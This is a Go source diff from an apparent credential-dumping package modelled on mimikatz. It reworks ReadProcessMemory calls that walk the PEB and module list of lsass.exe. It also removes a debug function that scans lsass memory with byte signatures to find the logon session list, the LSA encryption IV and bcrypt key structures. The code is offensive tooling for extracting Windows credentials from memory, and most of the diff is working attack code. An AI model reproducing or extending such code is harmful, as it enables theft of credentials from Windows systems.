@@ -3,8 +3,6 @@
 package kiwi
 
 import (
-	"bytes"
-	"fmt"
 	"reflect"
 	"sort"
 	"sync"
@@ -14,7 +12,6 @@ import (
 	"github.com/pkg/errors"
 	"golang.org/x/sys/windows"
 
-	"project/internal/convert"
 	"project/internal/logger"
 	"project/internal/module/windows/api"
 	"project/internal/module/windows/privilege"
@@ -192,7 +189,7 @@ func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModule
 	// read PEB base address
 	var pbi api.ProcessBasicInformation
 	ic := api.InfoClassProcessBasicInformation
-	_, err := api.NTQueryInformationProcess(pHandle, ic, uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi))
+	_, err := api.NTQueryInformationProcess(pHandle, ic, (*byte)(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi))
 	if err != nil {
 		return nil, err
 	}
@@ -204,7 +201,7 @@ func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModule
 		padding [paddingSize]byte
 	}
 	size := unsafe.Sizeof(peb.PEB) + uintptr(256+kiwi.rand.Int(512))
-	_, err = api.ReadProcessMemory(pHandle, pbi.PEBBaseAddress, uintptr(unsafe.Pointer(&peb)), size)
+	_, err = api.ReadProcessMemory(pHandle, pbi.PEBBaseAddress, (*byte)(unsafe.Pointer(&peb)), size)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read PEB structure")
 	}
@@ -216,7 +213,7 @@ func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModule
 		padding [paddingSize]byte
 	}
 	size = unsafe.Sizeof(loaderData.PEBLDRData) + uintptr(256+kiwi.rand.Int(512))
-	_, err = api.ReadProcessMemory(pHandle, peb.LoaderData, uintptr(unsafe.Pointer(&loaderData)), size)
+	_, err = api.ReadProcessMemory(pHandle, peb.LoaderData, (*byte)(unsafe.Pointer(&loaderData)), size)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to read PEB loader data")
 	}
@@ -233,7 +230,7 @@ func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModule
 	}
 	for addr := begin; addr < end; addr = uintptr(unsafe.Pointer(ldrEntry.InMemoryOrderLinks.Flink)) - offset {
 		size = unsafe.Sizeof(ldrEntry.LDRDataTableEntry) + uintptr(256+kiwi.rand.Int(512))
-		_, err = api.ReadProcessMemory(pHandle, addr, uintptr(unsafe.Pointer(&ldrEntry)), size)
+		_, err = api.ReadProcessMemory(pHandle, addr, (*byte)(unsafe.Pointer(&ldrEntry)), size)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to read loader data table entry")
 		}
@@ -241,7 +238,7 @@ func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModule
 		bufAddr := ldrEntry.BaseDLLName.Buffer
 		size = uintptr(ldrEntry.BaseDLLName.MaximumLength)
 		baseDLLName := make([]byte, int(size)+256+kiwi.rand.Int(512))
-		_, err = api.ReadProcessMemory(pHandle, bufAddr, uintptr(unsafe.Pointer(&baseDLLName[0])), size)
+		_, err = api.ReadProcessMemory(pHandle, bufAddr, (*byte)(unsafe.Pointer(&baseDLLName[0])), size)
 		if err != nil {
 			return nil, errors.WithMessage(err, "failed to read base dll name")
 		}
@@ -276,129 +273,3 @@ func (kiwi *Kiwi) getLSASSBasicModuleInfo(pHandle windows.Handle) ([]*basicModul
 	kiwi.log(logger.Info, "load module information about lsass.exe successfully")
 	return kiwi.modules, nil
 }
-
-var (
-	win6xLogonSessionList = []byte{0x33, 0xFF, 0x41, 0x89, 0x37, 0x4C, 0x8B, 0xF3, 0x45, 0x85, 0xC0, 0x74}
-
-	win10LSAInitializeProtectedMemoryKey = []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D,
-		0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15} // 67, -89, 16
-)
-
-type bcryptHandleKey struct {
-	size       uint32
-	tag        uint32 // R U U U
-	hAlgorithm uintptr
-	key        uintptr // bcryptKey
-	unk0       uintptr
-}
-
-type bcryptKey81 struct {
-	size    uint32
-	tag     uint32 // K S S M
-	typ     uint32
-	unk0    uint32
-	unk1    uint32
-	unk2    uint32
-	unk3    uint32
-	unk4    uint32
-	unk5    uintptr // before, align in x64
-	unk6    uint32
-	unk7    uint32
-	unk8    uint32
-	unk9    uint32
-	hardKey hardKey
-}
-
-type hardKey struct {
-	cbSecret uint32
-	data     [4]byte // self append
-}
-
-func (kiwi *Kiwi) searchMemory(pHandle windows.Handle, address uintptr, length int) error {
-	memory := make([]byte, length)
-	_, err := api.ReadProcessMemory(pHandle, address, uintptr(unsafe.Pointer(&memory[0])), uintptr(length))
-	if err != nil {
-		return errors.WithMessage(err, "failed to search memory")
-	}
-
-	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0
-	// /mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
-
-	index := bytes.Index(memory, win6xLogonSessionList)
-	address1 := address + uintptr(index) + 23 // TODO 16 -> 23
-	// lsass address
-	var offset int32
-	_, err = api.ReadProcessMemory(pHandle, address1, uintptr(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
-	if err != nil {
-		return errors.WithMessage(err, "failed to search memory")
-	}
-	fmt.Printf("%X\n", address1)
-	fmt.Println(offset)
-	fmt.Println(convert.LEInt32ToBytes(offset))
-	fmt.Println()
-
-	genericPtr := address1 + 4 + uintptr(offset)
-
-	fmt.Printf("%X\n", genericPtr)
-
-	address1 = address + uintptr(index) - 4
-	_, err = api.ReadProcessMemory(pHandle, address1, uintptr(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
-	if err != nil {
-		return errors.WithMessage(err, "failed to search iv")
-	}
-	fmt.Printf("%X\n", address1)
-	fmt.Println(offset)
-	fmt.Println(convert.LEInt32ToBytes(offset))
-	fmt.Println()
-
-	genericPtr2 := address1 + 4 + uintptr(offset)
-	fmt.Printf("%X\n", genericPtr2)
-
-	// address1 += 4 + uintptr(offset64)
-
-	index = bytes.Index(memory, win10LSAInitializeProtectedMemoryKey)
-
-	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/
-	// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
-
-	address2 := address + uintptr(index) + 67 // TODO off0
-	fmt.Printf("%X\n", address2)
-
-	var offset2 uint32
-	_, err = api.ReadProcessMemory(pHandle, address2, uintptr(unsafe.Pointer(&offset2)), unsafe.Sizeof(offset2))
-	if err != nil {
-		return errors.WithMessage(err, "failed to read iv")
-	}
-
-	address2 += 4 + uintptr(offset2)
-	fmt.Printf("%X\n", address2)
-
-	iv := make([]byte, 16)
-	_, err = api.ReadProcessMemory(pHandle, address2, uintptr(unsafe.Pointer(&iv[0])), uintptr(16))
-	if err != nil {
-		return errors.WithMessage(err, "failed to search iv")
-	}
-	fmt.Println(iv)
-
-	address3 := address + uintptr(index) - 89 // TODO off1
-	fmt.Printf("%X\n", address3)
-
-	var offset3 int32
-	_, err = api.ReadProcessMemory(pHandle, address3, uintptr(unsafe.Pointer(&offset3)), unsafe.Sizeof(offset3))
-	if err != nil {
-		return errors.WithMessage(err, "failed to search iv")
-	}
-	fmt.Println(convert.LEInt32ToBytes(offset3))
-
-	address3 += 4 + uintptr(offset3)
-	var pointer1 uintptr
-	_, err = api.ReadProcessMemory(pHandle, address3, uintptr(unsafe.Pointer(&pointer1)), unsafe.Sizeof(pointer1))
-	if err != nil {
-		return errors.WithMessage(err, "failed to search iv")
-	}
-	fmt.Printf("%X\n", pointer1)
-
-	return nil
-}
-
-// 33 ff 41 89 37 4c 8b f3 45 85 c0 74
